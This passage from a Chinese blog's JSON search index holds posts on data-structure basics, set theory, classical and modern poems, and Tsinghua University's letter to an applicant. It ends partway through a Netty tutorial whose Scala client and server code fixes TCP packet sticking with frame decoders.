算法设计之五大常用算法设计方法总结","updated":"2020-07-19T00:23:28.051Z","tags":[{"name":"数据结构和算法","slug":"数据结构和算法","permalink":"http://xwolf191.github.io/tags/数据结构和算法/"}]},{"title":"数据结构(1):数据结构基础","date":"2017-11-09T08:40:00.000Z","path":"2017/11/09/数据结构和算法/数据结构(1)、数据结构基础/","text":"一、概述 在计算机科学中，数据结构（英语：data structure）是计算机中存储、组织数据的方式。数据结构意味着接口或封装：一个数据结构可被视为两个函数之间的接口，或者是由数据类型联合组成的存储内容的访问方法封装。大多数数据结构都由数列、记录、可辨识联合、引用等基本类型构成。举例而言，可为空的引用（nullable reference）是引用与可辨识联合的结合体，而最简单的链式结构链表则是由记录与可空引用构成。 二、基本概念 数据（Data) 数据是信息的载体。它能够被计算机识别、存储和加工处理，是计算机程序加工的&quot;原料&quot;。 随着计算机应用领域的扩大，数据的范畴包括：整数、实数、字符串、图像和声音等。 数据元素（Data Element） 数据元素是数据的基本单位。数据元素也称元素、结点、顶点、记录。 一个数据元素可以由若干个数据项（也可称为字段、域、属性）组成。 数据项是具有独立含义的最小标识单位。 数据项 一个数据元素可以由多个数据项组成。数据项是数据不可分割的最小单位。 数据对象 数据对象是性质相同的数据元素的集合,是数据的子集。 数据结构（Data Structure） 数据结构指的是数据之间的相互关系，即数据的组织形式。 1．数据结构一般包括以下三方面内容： ① 数据元素之间的逻辑关系，也称数据的逻辑结构（Logical Structure）； 数据的逻辑结构是从逻辑关系上描述数据，与数据的存储无关，是独立于计算机的。数据的逻辑结构可以看作是从具体问题抽象出来的数学模型。 ② 数据元素及其关系在计算机存储器内的表示，称为数据的存储结构（Storage Structure）； 数据的存储结构是逻辑结构用计算机语言的实现（亦称为映象），它依赖于计算机语言。对机器语言而言，存储结构是具体的。一般，只在高级语言的层次上讨论存储结构。 ③ 数据的运算，即对数据施加的操作。数据的运算定义在数据的逻辑结构上，每种逻辑结构都有一个运算的集合。最常用的检索、插入、删除、更新、排序等运算实际上只是在抽象的数据上所施加的一系列抽象的操作。所谓抽象的操作，是指我们只知道这些操作是”做什么”，而无须考虑”如何做”。只有确定了存储结构之后，才考虑如何具体实现这些运算。 三、分类 按照视点不同,数据结构可以分为逻辑结构和物理结构。 逻辑结构 逻辑结构是数据对象中数据元素的关系。逻辑结构可以分为以下几种: 1. 集合结构 数据结构中纯集合结构指的是在数据元素之间除了“同属一个集合”之外，别无其他关系。 2. 线性结构 数据结构中线性结构指的是数据元素之间存在着“一对一”的线性关系的数据结构。线性结构是一个有序数据元素的集合常用的线性结构有：线性表，栈，队列，双队列，数组，串。 3. 树结构 树是一种重要的非线性数据结构，直观地看，它是数据元素（在树中称为结点）按分支关系组织起来的结构，很象自然界中的树那样。树结构在客观世界中广泛存在，如人类社会的族谱和各种社会组织机构都可用树形象表示。树在计算机领域中也得到广泛应用，如在编译源程序如下时，可用树表示源源程序如下的语法结构。又如在数据库系统中，树型结构也是信息的重要组织形式之一。一切具有层次关系的问题都可用树来描述。 4. 图结构 图形结构，简称“图”，是一种复杂的数据结构。图形结构中，每个结点的前驱结点数和后续结点数可以任意多个。数据元素间的关系是任意的。其他数据结构(如树、线性表等)都有明确的条件限制，而图形结构中任意两个数据元素间均可相关联。常用来研究生产流程、施工计划、各种网络建设等问题。 物理结构 顺序存储结构 在计算机中用一组地址连续的存储单元依次存储线性表的各个数据元素,称作线性表的顺序存储结构。由此得到的存储结构为顺序存储结构，通常顺序存储结构是借助于计算机程序设计语言（例如c/c++）的数组来描述的。顺序存储结构的主要优点是节省存储空间，因为分配给数据的存储单元全用存放结点的数据（不考虑c/c++语言中数组需指定大小的情况），结点之间的逻辑关系没有占用额外的存储空间。采用这种方法时，可实现对结点的随机存取，即每一个结点对应一个序号，由该序号可以直接计算出来结点的存储地址。但顺序存储方法的主要缺点是不便于修改，对结点的插入、删除运算时，可能要移动一系列的结点。优点：随机存取表中元素。缺点：插入和删除操作需要移动元素。 链式存储结构 链式存储结构，又叫链接存储结构。在计算机中用一组任意的存储单元存储线性表的数据元素(这组存储单元可以是连续的,也可以是不连续的). 一般在计算机的硬盘中，文件都是链式存储的。我们知道，多个扇区组成一个簇，簇是计算机存储数据的基本单位。而一个文件是存储在多个在空间上也许并不相连的簇中的。这就是链式存储。但是为了能够读取出这个文件，计算机会在该文件第一部分的尾部写上第二部分所在的簇号。第二部分的尾部又写上第三部分，以此类推，最后一部分写上一段代码，表示这是该文件的最后一部分。值得一提的是，高簇号在后。（如代码所示的1234实为簇3412）文件所占簇可认为是随机分配的。 链式存储结构特点：1、比顺序存储结构的存储密度小(链式存储结构中每个结点都由数据域与指针域两部分组成，相比顺序存储结构增加了存储空间)。2、逻辑上相邻的节点物理上不必相邻。3、插入、删除灵活 (不必移动节点，只要改变节点中的指针)。4、查找结点时链式存储要比顺序存储慢。5、每个结点是由数据域和指针域组成。6、由于簇是随机分配的，这也使数据删除后覆盖几率降低，恢复可能提高。 四、抽象数据类型 抽象数据类型(Abstract Data Type 简称ADT)是指一个数学模型以及定义在此数学模型上的一组操作。抽象数据类型需要通过固有数据类型（高级编程语言中已实现的数据类型）来实现。抽象数据类型是与表示无关的数据类型，是一个数据模型及定义在该模型上的一组运算。对一个抽象数据类型进行定义时，必须给出它的名字及各运算的运算符名，即函数名，并且规定这些函数的参数性质。一旦定义了一个抽象数据类型及具体实现，程序设计中就可以像使用基本数据类型那样，十分方便地使用抽象数据类型。 参考资料: 算法导论 大话数据结构","updated":"2020-07-19T00:23:28.048Z","tags":[{"name":"数据结构和算法","slug":"数据结构和算法","permalink":"http://xwolf191.github.io/tags/数据结构和算法/"}]},{"title":"高数(一) 函数与极限","date":"2017-11-08T12:20:00.000Z","path":"2017/11/08/数学/高数(一)函数与极限/","text":"一、映射与函数 集合是指具有某种特定性质的事物的总体,组成这个集合的事物称为该集合的元素。 我们通常用大字拉丁字母A、B、C、„„表示集合，用小写拉丁字母a、b、c„„表示集合中的元素。如果a是集合A中的元素，就说a属于A，记作：a∈A，否则就说a不属于A，记作：aA。 ⑴、全体非负整数组成的集合叫做非负整数集（或自然数集）。记作N ⑵、所有正整数组成的集合叫做正整数集。记作N+或N+。⑶、全体整数组成的集合叫做整数集。记作Z。⑷、全体有理数组成的集合叫做有理数集。记作Q。⑸、全体实数组成的集合叫做实数集。记作R。 集合的表示方法⑴、列举法：把集合的元素一一列举出来，并用“｛｝”括起来表示集合 。 M = \\{1,3,4,5,4\\}⑵、描述法：用集合所有元素的共同特征来表示集合。 P = \\{x|x^2-6=0\\}集合间的基本关系 ⑴、子集：一般地，对于两个集合A、B，如果集合A中的任意一个元素都是集合B的元素，我们就说A、B有包含关系，称集合A为集合B的子集，记作A\\subset 或 B\\supset A ⑵相等：如何集合A是集合B的子集，且集合B是集合A的子集，此时集合A中的元素与集合B中的元素完全一样，因此集合A与集合B相等，记作A＝B。 ⑶、真子集：如何集合A是集合B的子集，但存在一个元素属于B但不属于A，我们称集合A是集合B的真子集， ⑷、空集：我们把不含任何元素的集合叫做空集。记作 \\phi, 并规定空集是任何集合的子集。 ⑸、由上述集合之间的基本关系,可以得到下面的结论： ①、任何一个集合是它本身的子集。即A\\subseteq A。 ②、对于集合A、B、C，如果A是B的子集，B是C的子集，则A是C的子集。 ③、我们可以把相等的集合叫做“等集”，这样的话子集包括“真子集”和“等集”。","updated":"2020-07-19T00:23:28.012Z","tags":[{"name":"数学","slug":"数学","permalink":"http://xwolf191.github.io/tags/数学/"}]},{"title":"仓央嘉措：我问佛","date":"2017-11-03T01:25:00.000Z","path":"2017/11/03/杂侃/仓央嘉措：我问佛/","text":"《我问佛》，此文作者颇有争议，普遍认为是仓央嘉措的作品，也有说是出自现代人之手。不过无论是谁写的，都是一篇难得的经典好文。 仓央嘉措是一位才华出众、富有文采的民歌诗人，写了很多细腻真挚的情歌。最为经典的拉萨藏文木刻版《仓央嘉措情歌》，被译成20多种文字，几乎传遍了全世界，他的诗歌已经超越民族、时空、国界，成为宝贵的文化遗产。 《我问佛》 我问佛 为何不给所有女子 羞花闭月的容颜 佛曰: 那只是昙花的一现 用来蒙蔽世俗的眼 没有什么美 可以抵过一颗纯净仁爱的心 我把它赐给每一个女子 可有的人让它蒙上了灰 我问佛 世间为何有那么多遗憾? 佛曰: 这是一个婆娑世界 婆娑即遗憾 没有遗憾 给你再多幸福 也不会体会快乐 我问佛 如何让人们的心 不再感到孤单? 佛曰： 每一颗心 生来就是孤单而残缺的 多数带着这种残缺度过一生 只因与能使它圆满的另一半相遇时， 不是疏忽错过， 就是已失去了拥有它的资格。 我问佛: 如果遇到了可以爱的人， 却又怕不能把握该怎么办? 佛曰: 留人间多少爱 迎浮世千重变 和有情人做快乐事 别问是劫是缘 我问佛: 为什么总是 在我悲伤的时候下雪 佛说: 冬天就要过去，留点记忆 我问佛: 为什么每次下雪 都是我不在意的夜晚 佛说: 不经意的时候 人们总会错过很多真正的美丽 我问佛: 那过几天还下不下雪 佛说: 不要只盯着这个季节， 错过了今冬 我问佛: 如何才能如你般睿智? 佛曰: 人生有八苦 生老病死 爱别离 怨长久 求不得 放不下 只有在体验痛苦的过程中 参透生命的真谛 才能得到永生 春来花自青,秋至叶飘零, 生存于自然法则之中 一个人必须看得懂 放得下 才能得到自在","updated":"2020-07-19T00:23:28.412Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"人生实苦，但请你足够相信！","date":"2017-11-03T01:00:00.000Z","path":"2017/11/03/杂侃/人生实苦，但请你足够相信/","text":"这两天，甘肃考生魏祥的经历牵动了很多人的心。在魏祥发出求助信后，清华大学招生办专门写出回信，表示将尽最大努力帮助他，这封回信，同样令人动容。残疾学子自强不息的奋斗与名校自强不息气质的交响，让人听到了情怀和境界的声音—— 再过两个月，有一群人生得意、金榜题名的孩子将入读北京西北郊的那座曾经的皇家园林——清华园。在那里，将有很多来自欠发达地区的同学，这或许是他们第一次离开家乡，来到北京。他们可能不会那么有见识、有自信，但是他们跟许多人一样经历了奋斗，只是那奋斗是如此不同…… 6月26日，微信公众号“大美甘肃”发表了《一位甘肃高分(648分)考生的请求》。请求来自“苦甲天下的甘肃定西”高三考生魏祥，定西一中毕业生。他先天性脊柱裂、椎管内囊肿，出生后双下肢运动功能丧失，更不幸的是下岗多年的爸爸又早逝，只有坚强的妈妈陪着残疾但优秀的儿子一路求学，直至考上清华！他的这份请求，只是希望清华能给他们母子俩帮助解决一间陋宿，供娘儿俩济身而已。 图为甘肃学子魏祥 魏祥在今年高考中取得了648分的优异成绩，已经报考清华大学。他希望清华大学能提供一间宿舍，能让自己和母亲一同前往，方便他顺利完成大学学业。 甘肃学子魏祥向清华大学求助的信得到清华大学校长邱勇以及社会各界关注。 更令人感动的是清华大学招生组的爱心和情怀，连夜对该同学的请求进行回应和处理，这真是实实在在的精准扶贫。 清华大学招办主任刘震于26日晚10：43分左右在微信中留言如下： “我是清华大学招办主任刘震。魏祥同学已经报考我校。我校老师已经与他取得联系，为他提供一切尽可能的资助！清华不会让任何一位优秀学生因为经济原因而辍学！” 27日下午，清华大学招办以《人生实苦，但请你足够相信》为题专门致信魏祥，称将最大努力资助魏祥。 以下为清华大学招办给魏祥回信原文 亲爱的魏祥同学： 见字如面。 首先恭喜你即将来到清华大学，继续你的学习和生活。我们看到了你写给清华大学的文章《一位甘肃高分考生的请求》，相信你早已具备了清华人自强不息、厚德载物的品质，我们代表清华园欢迎来自甘肃定西的你！ 《繁星·春水》中有这样一首小诗：“童年啊，是梦中的真，是真中的梦，是回忆时含泪的微笑。”想来这句话应该符合你的童年记忆吧。在梦一般的年华里，却要承受含泪的记忆，这泪水不包含欢喜，不代表留恋。不幸的人生，各有各的悲苦。但万幸的是，你在经历疾病和丧亲之痛后，依然选择了坚强和努力，活成了让我们都尊敬和崇拜的样子。 你说“一个多月的住院治疗，我和妈妈相依为命，身心深受煎熬，我的身体几经折磨，痛不欲生，妈妈的精神濒临崩溃，孤零零的她没了爸爸的陪伴和支撑，可怜无比。”只言片语，我们知晓你母亲道阻且长的育子之路，更深切地感受到了你作为儿子对母亲深沉的爱和歉疚。但正如你所说，今日以高分佳绩考入清华，就是给了妈妈一份殷殷的报恩之礼！ 邱勇校长在2015级新生开学典礼上曾说：“我是1983年进入清华的。我知道，无论那时还是现在，能够来到清华上学都是不容易的，你们在成长过程中一定遇到过各种各样的困难和挑战。”同样，对于你来说，来路或许不易，命运或许不公，人生或许悲苦，但是请你足够相信，相信清华，相信这个园子里的每一位师生，因为我们都在为一种莫名的东西付出，我想这应该就是情怀。党委书记陈旭老师也曾寄语自强计划的学生：“自强就要做到自主，大学能收获什么取决于自己怎么去努力。”所以也请你相信自己，可以在清华园里找到热爱，追求卓越。 读到你的来信后，清华大学招生办公室主任刘震老师在该微信文章下留言道“魏祥同学已经报考我校。我校老师已经与他取得联系，为他提供一切尽可能的资助！清华不会让任何一位优秀学生因为经济原因而辍学！”确实，清华大学多有与你有同样经历的学子，在家庭经济与身体因素的双重压力下，依然奋发图强。他们或携笔从戎，守护家国平安；或回馈基层，在公益组织中施展才能；或致知穷理，一举夺得清华大学本科生特等奖学金的殊荣…… 现在，你的情况受到了清华师生、校友和社会各界的关注。昨天深夜，邱勇校长专门打来电话，关心你的录取情况和入校后的生活安排情况；陈旭老师也请学生部门第一时间对接，妥善安排解决你的后顾之忧。清华大学学生资助管理中心的老师也极力配合，在你被确认录取后会立刻开始资助。清华大学多位校友也在看到消息的第一时间，主动提出资助和协助你治疗的意愿，后续学校相关部门都会跟进落实。请你相信，校内外有足够多的支持，清华不会错过任何一位优秀学子！ 冰心赠葛洛的一首诗中说“爱在左，情在右，在生命的两旁，随时撒种，随时开花，将这一径长途点缀得花香弥漫，使得穿花拂叶的行人，踏着荆棘，不觉痛苦，有泪可挥，不觉悲凉。”在清华园里的所有学子，无论是生活困顿，抑或身体抱恙，都会有“爱” 与“情” 相伴。相信未来的你，也会和活跃在各领域的清华学子们一样，穿花拂叶，除却一身困顿，成就自己的不同凡响。 感谢社会各界人士对魏祥同学和我校本科招生工作的关注和关心。在此，我们想对在求学路上荆棘丛生的学子们说：人生实苦，但请你足够相信！ 清华大学招生办公室 2017年6月27日 一位甘肃高分(648分)考生的请求 我叫魏祥，男，汉族，现年19岁，家住苦甲天下的甘肃定西，定西一中高三毕业生。 本人因先天性脊柱裂、椎管内囊肿，出生后双下肢运动功能丧失，大小便失禁，爸爸妈妈在我半岁、两岁定时先后奔赴定西市医院、西安西京医院，寻求专家为我手术治疗疾病，但两次手术病情均未见好转，身体残疾情况没有得到改善，更不幸的是下岗多年的爸爸又身患不治之症，医治无效于2005年去世，留下年幼无知身体残疾的我和年轻无助的妈妈。 坚强伟大的妈妈在悲痛欲绝的日子里，不但没有放弃过对我细心无微的照顾，反而更加疼爱我，竭尽全力为我付出，并省吃俭用，除供我上学之外，她将少得可怜的工资多一分都舍不得花积攒下来，为我治病。于2008年6月，妈妈再次背着我踏上了北去的火车，寻求北京天坛医院神经外科专家，为我实施第三次手术治疗。1个多月的住院治疗，我和妈妈相依为命，身心深受煎熬，我的身体几经折磨，痛不欲生，妈妈的精神频临奔溃，孤零零的她没了爸爸的陪伴和支撑，可怜无比，更使我再次深感妈妈的艰辛不易与伟大。可是不争气的我，3次手术都未能改善我的身体状况，残疾依旧，且随着年龄增长残疾日趋严重。 钢铁般坚强的妈妈，擦干了眼泪，一如既往，风雨无阻背我上学。从小学中学到高中，12年如一日，妈妈的背影穿梭于小学中学到高中的大街小巷、校门、教室，好像她从来不知疲倦；12年的妈妈不仅仅是一名医院上班的护士，更是一位残疾少年求学路上的陪读者，守护神；12年的妈妈身教残儿志不残，历尽沧桑终不悔；12年的我竭尽全力，克服身体残障，刻苦求学，完成了中小学阶段的基础教育，今日以648的高考成绩，给了我深爱的妈妈一份殷殷的报恩之礼，同时也给了不断关心呵护我，鼓励我，培养我的各阶段的恩师一份比较满意的答卷。 今有幸遇见举世闻名的清华大学老师，且有意备录我圆大学之梦，得此喜讯，我母子俩狂喜之余，又新添愁云，由于我的身体原因，无论我走到哪里，这辈子都离不开亲人的随身陪护，以照顾我的衣食住行，生活起居，妈妈为了陪我上学无奈放弃工作，仅有的经济来源将要斩断……在此，我恳切希望贵校在接纳我的同时，能够给我母子俩帮助解决一间陋宿，仅供我娘儿俩济身而已，学生我将万分万分感谢！！ 这样身残志坚的学生，在清华已经不是第一位了。今年已经在清华攻读研究生的矣晓沅，自幼患上类风湿性关节炎致残，也是在母亲的陪伴下完成了清华的四年本科学习，而且还拿到了清华学霸才能染指的特等奖学金！ 最后，借用清华招办回信中的一句话，向所有经历坎坷，却足够强大的年轻人致意： 转自: 清华致甘肃考生魏祥：人生实苦，但请你足够相信","updated":"2020-07-19T00:23:28.411Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"凤求凰","date":"2017-11-02T07:30:00.000Z","path":"2017/11/02/杂侃/凤求凰/","text":"司马相如 有一美人兮，见之不忘。 一日不见兮，思之如狂。 凤飞翱翔兮，四海求凰。 无奈佳人兮，不在东墙。 将琴代语兮，聊写衷肠。 何日见许兮，慰我彷徨。 愿言配德兮，携手相将。 不得於飞兮，使我沦亡。 凤兮凤兮归故乡，遨游四海求其凰。 时未遇兮无所将，何悟今兮升斯堂！ 有艳淑女在闺房，室迩人遐毒我肠。 何缘交颈为鸳鸯，胡颉颃兮共翱翔！ 凰兮凰兮从我栖，得托孳尾永为妃。 交情通意心和谐，中夜相从知者谁？ 双翼俱起翻高飞，无感我思使余悲。","updated":"2020-07-19T00:23:28.413Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"我以为我很坚强","date":"2017-11-02T06:10:00.000Z","path":"2017/11/02/杂侃/我以为我很坚强/","text":"我以为我很坚强 会独自一人坚持到天亮 却发现有一颗心的碎片 竟撒满了我翻滚的床 我以为我很骄傲 会让没有你的今夜辉煌 却发现冰冷的吉他 弹响的竟是我的忧伤 静静地靠着墙 以为什么都可以不想 却发现你的影子 竟刻在我的心上 我以为我很坚强 从来不会让泪流出眼眶 可看着你离去的背影 心竟有说不出的惆怅 静静地靠着墙 以为可以什么都不想 却发现刻骨的爱 竟让我无法抵抗","updated":"2020-07-19T00:23:28.425Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"钗头凤","date":"2017-11-02T06:10:00.000Z","path":"2017/11/02/杂侃/钗头凤/","text":"钗头凤·红酥手宋代：陆游 红酥手，黄縢酒，满城春色宫墙柳。东风恶，欢情薄。一怀愁绪，几年离索。错、错、错。春如旧，人空瘦，泪痕红浥鲛绡透。桃花落，闲池阁。山盟虽在，锦书难托。莫、莫、莫！ 钗头凤·世情薄宋代：唐婉 世情薄，人情恶，雨送黄昏花易落。晓风干，泪痕残。欲笺心事，独语斜阑。难，难，难！人成各，今非昨，病魂常似秋千索。角声寒，夜阑珊。怕人寻问，咽泪装欢。瞒，瞒，瞒！(装欢 通：妆)","updated":"2020-07-19T00:23:28.439Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"Netty TCP拆、粘包解决","date":"2017-11-01T08:42:00.000Z","path":"2017/11/01/distributed/Netty TCP拆、粘包解决/","text":"TCP/UDP简介 TCP（transport control protocol，传输控制协议）是面向连接的，面向流的，提供高可靠性服务。收发两端（客户端和服务器端）都要有一一成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小且数据量小的数据，合并成一个大的数据块，然后进行封包。这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。 即面向流的通信是无消息保护边界的。 UDP（user datagram protocol，用户数据报协议）是无连接的，面向消息的，提供高效率服务。不会使用块的合并优化算法，, 由于UDP支持的是一对多的模式，所以接收端的skbuff(套接字缓冲区）采用了链式结构来记录每一个到达的UDP包，在每个UDP包中就有了消息头（消息来源地址，端口等信息），这样，对于接收端来说，就容易进行区分处理了。 即面向消息的通信是有消息保护边界的。由于TCP无消息保护边界, 需要在消息接收端处理消息边界问题。也就是为什么我们以前使用UDP没有此问题。 反而使用TCP后，出现少包的现象。 TCP粘包 TCP粘包是指发送方发送的若干包数据到接收方接收时粘成一包，从接收缓冲区看，后一包数据的头紧接着前一包数据的尾。出现粘包现象的原因是多方面的，它既可能由发送方造成，也可能由接收方造成。 客户端发送两个数据包A1、A2。服务端可能读到A1和A2的一部分就会出现粘包问题。 TCP粘包的原因: 应用程序写入的字节大小大于套接口发送缓冲大小 进行MSS大小的TCP分段 以太网帧的payload大于MTU进行IP分片 粘包问题的解决: 发送端给每个数据包添加包首部，首部中应该至少包含数据包的长度，这样接收端在接收到数据后，通过读取包首部的长度字段，便知道每一个数据包的实际长度了。 发送端将每个数据包封装为固定长度（不够的可以通过补0填充），这样接收端每次从接收缓冲区中读取固定长度的数据就自然而然的把每个数据包拆分开来。 可以在数据包之间设置边界，如添加特殊符号，这样，接收端通过这个边界就可以将不同的数据包拆分开。 TCP粘包问题重现及解决粘包问题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import io.netty.bootstrap.ServerBootstrapimport io.netty.channel.nio.NioEventLoopGroupimport io.netty.channel.socket.SocketChannelimport io.netty.channel.socket.nio.NioServerSocketChannelimport io.netty.channel.&#123;ChannelInitializer, ChannelOption&#125;import io.netty.handler.codec.LineBasedFrameDecoderimport io.netty.handler.codec.string.StringDecoderimport io.netty.handler.logging.&#123;LogLevel, LoggingHandler&#125;/** * 拆包粘包问题 * @author xwolf * @since 1.8 **/class FragmentedServer &#123; def bind(host:String,port:Int):Unit=&#123; //服务端接收客户端请求 val bossGroup = new NioEventLoopGroup() // 处理socketChannel网络读写请求 val workerGroup = new NioEventLoopGroup() try &#123; //服务启动辅助 val serverBootstrap = new ServerBootstrap() //添加I/O 事件处理, serverBootstrap.group(bossGroup, workerGroup) .channel(classOf[NioServerSocketChannel]).option(ChannelOption.SO_BACKLOG.asInstanceOf[ChannelOption[Any]],1024) .childHandler(new ChannelInitializer[SocketChannel] &#123; override def initChannel(ch: SocketChannel) = &#123; //ch.pipeline().addLast(new LineBasedFrameDecoder(1024)) // ch.pipeline().addLast(new StringDecoder()) ch.pipeline().addLast(new LoggingHandler(LogLevel.DEBUG)) ch.pipeline().addLast(new FragmentedServerHandler) &#125; &#125;) //绑定端口,等待绑定完成 val futureChannel = serverBootstrap.bind(host, port).sync() futureChannel.channel().closeFuture().sync() &#125; finally&#123; //优雅关机 bossGroup.shutdownGracefully() workerGroup.shutdownGracefully() &#125; &#125;&#125;object FragmentedServer&#123; def main(args: Array[String]): Unit = &#123; val server =new FragmentedServer server.bind(\"localhost\",9091) &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041import java.text.SimpleDateFormatimport java.util.Dateimport io.netty.buffer.Unpooledimport io.netty.channel.&#123;ChannelHandlerContext, ChannelInboundHandlerAdapter&#125;/** * @author xwolf * @since 1.8 **/class FragmentedServerHandler extends ChannelInboundHandlerAdapter&#123; var count = 0 override def channelActive(ctx: ChannelHandlerContext): Unit = println(\"server: channelActive\") override def channelReadComplete(ctx: ChannelHandlerContext) = println(\"server channelReadComplete\") override def channelRead(ctx: ChannelHandlerContext, msg: scala.Any): Unit = &#123; println(\"server channelRead invoked\") val separator = System.getProperty(\"line.separator\") val message = msg.asInstanceOf[String] count += 1 println(s\"服务端接收的内容:$message,总共计数为:$count\") val currentTime = getCurrentTime() val back =if (\"EXIT\".contains(message)) s\"client请求EXIT,当前时间:$currentTime\" else s\"client请求信息:$message,当前时间:$currentTime\" val resp = Unpooled.copiedBuffer((back+count+separator).getBytes(\"UTF-8\")) ctx.writeAndFlush(resp) &#125; def getCurrentTime(): String =&#123; val format = new SimpleDateFormat(\"YYYY-MM-dd HH:mm:ss.SSS\") format.format(new Date) &#125; override def exceptionCaught(ctx: ChannelHandlerContext, cause: Throwable): Unit = &#123; println(\"server exception close,message:\"+ cause.printStackTrace()) ctx.close() &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445import io.netty.bootstrap.Bootstrapimport io.netty.channel.nio.NioEventLoopGroupimport io.netty.channel.socket.SocketChannelimport io.netty.channel.socket.nio.NioSocketChannelimport io.netty.channel.&#123;ChannelInitializer, ChannelOption&#125;import io.netty.handler.codec.LineBasedFrameDecoderimport io.netty.handler.codec.string.StringDecoderimport io.netty.handler.logging.&#123;LogLevel, LoggingHandler&#125;/** * @author xwolf * @since 1.8 **/class FragmentedClient &#123; def connect(host:String,port:Int):Unit=&#123; val work = new NioEventLoopGroup() val bootstrap = new Bootstrap() try &#123; bootstrap.group(work).channel(classOf[NioSocketChannel]). option(ChannelOption.TCP_NODELAY.asInstanceOf[ChannelOption[Any]],true).handler(new ChannelInitializer[SocketChannel] &#123; override def initChannel(ch: SocketChannel) =&#123; //ch.pipeline().addLast(new LineBasedFrameDecoder(1024)) //ch.pipeline().addLast(new StringDecoder()) ch.pipeline().addLast(new LoggingHandler(LogLevel.DEBUG)) ch.pipeline().addLast(new FragmentedClientHandler) &#125; &#125;) val funture = bootstrap.connect(host, port).sync() funture.channel().closeFuture().sync() &#125; finally&#123; work.shutdownGracefully() &#125; &#125;&#125;object FragmentedClient&#123; def main(args: Array[String]): Unit = &#123; val client = new FragmentedClient client.connect(\"localhost\",9091) &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738import io.netty.buffer.Unpooledimport io.netty.channel.&#123;ChannelHandlerContext, ChannelInboundHandlerAdapter&#125;/** * @author xwolf * @since 1.8 **/class FragmentedClientHandler extends ChannelInboundHandlerAdapter&#123; override def channelActive(ctx: ChannelHandlerContext): Unit = &#123; println(\"client channelActive\") val separator = System.getProperty(\"line.separator\") var message:String = null for (i &lt;-0 to 50)&#123; if ( i % 2 == 0 )&#123; message = \"EXIT\" &#125; else &#123; message=\"client发送到服务端信息:\" &#125; val writeBuf =Unpooled.buffer(message.length()) writeBuf.writeBytes((message+i+separator).getBytes()) ctx.writeAndFlush(writeBuf) &#125; &#125; override def channelRead(ctx: ChannelHandlerContext, msg: scala.Any): Unit = &#123; println(\"client channelRead\") val message = msg.asInstanceOf[String] println(message) &#125; override def channelReadComplete(ctx: ChannelHandlerContext): Unit = &#123; println(\"client channeReadComplete\") ctx.flush() &#125;&#125; server端输出： client端输出： 发生粘包问题,客户端循环100次发送信息,服务端收到两条。 Netty解决粘包问题 基于 LineBasedFrameDecoder server/client都添加编码器 1234ch.pipeline().addLast(new LineBasedFrameDecoder(1024))ch.pipeline().addLast(new StringDecoder()) 客户端服务端都接收到相同的结果则拆包、粘包问题处理成功。 LineBasedFrameDecoder的工作原理是遍历ByteBuf中的可读字节，当遇到换行符\\n或者\\r\\n作为结束位置，从可读字节索引到结束位置作为一行。 StringDecoder 是将接收的对象转化为字符串。 基于DelimiterBasedFrameDecoder 自定义分隔符来解决拆粘包问题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import io.netty.bootstrap.ServerBootstrapimport io.netty.buffer.Unpooledimport io.netty.channel.nio.NioEventLoopGroupimport io.netty.channel.socket.SocketChannelimport io.netty.channel.socket.nio.NioServerSocketChannelimport io.netty.channel.&#123;ChannelInitializer, ChannelOption&#125;import io.netty.handler.codec.DelimiterBasedFrameDecoderimport io.netty.handler.codec.string.StringDecoderimport io.netty.handler.logging.&#123;LogLevel, LoggingHandler&#125;/** * 拆包粘包问题 * @author xwolf * @since 1.8 **/class DelimiterServer &#123; def bind(host:String,port:Int):Unit=&#123; //服务端接收客户端请求 val bossGroup = new NioEventLoopGroup() // 处理socketChannel网络读写请求 val workerGroup = new NioEventLoopGroup() try &#123; //服务启动辅助 val serverBootstrap = new ServerBootstrap() //定义分隔符 val delimiter = Unpooled.copiedBuffer(\"$*\".getBytes()) //添加I/O 事件处理, serverBootstrap.group(bossGroup, workerGroup) .channel(classOf[NioServerSocketChannel]).option(ChannelOption.SO_BACKLOG.asInstanceOf[ChannelOption[Any]],1024) .childHandler(new ChannelInitializer[SocketChannel] &#123; override def initChannel(ch: SocketChannel) = &#123; ch.pipeline().addLast(new DelimiterBasedFrameDecoder(1024,delimiter)) ch.pipeline().addLast(new StringDecoder()) ch.pipeline().addLast(new LoggingHandler(LogLevel.DEBUG)) ch.pipeline().addLast(new DelimiterServerHandler) &#125; &#125;) //绑定端口,等待绑定完成 val futureChannel = serverBootstrap.bind(host, port).sync() futureChannel.channel().closeFuture().sync() &#125; finally&#123; //优雅关机 bossGroup.shutdownGracefully() workerGroup.shutdownGracefully() &#125; &#125;&#125;object DelimiterServer&#123; def main(args: Array[String]): Unit = &#123; val server =new DelimiterServer server.bind(\"localhost\",9091) &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041import java.text.SimpleDateFormatimport java.util.Dateimport io.netty.buffer.Unpooledimport io.netty.channel.&#123;ChannelHandlerContext, ChannelInboundHandlerAdapter&#125;/** * @author xwolf * @since 1.8 **/class DelimiterServerHandler extends ChannelInboundHandlerAdapter&#123; var count = 0 override def channelActive(ctx: ChannelHandlerContext): Unit = println(\"server: channelActive\") override def channelReadComplete(ctx: ChannelHandlerContext) = println(\"server channelReadComplete\") override def channelRead(ctx: ChannelHandlerContext, msg: scala.Any): Unit = &#123; println(\"server channelRead invoked\") val message = msg.asInstanceOf[String] count += 1 println(s\"服务端接收的内容:$message,总共计数为:$count\") val currentTime = getCurrentTime() val back =if (\"EXIT\".contains(message)) s\"client请求EXIT,当前时间:$currentTime\" else s\"client请求信息:$message,当前时间:$currentTime\" val resp = 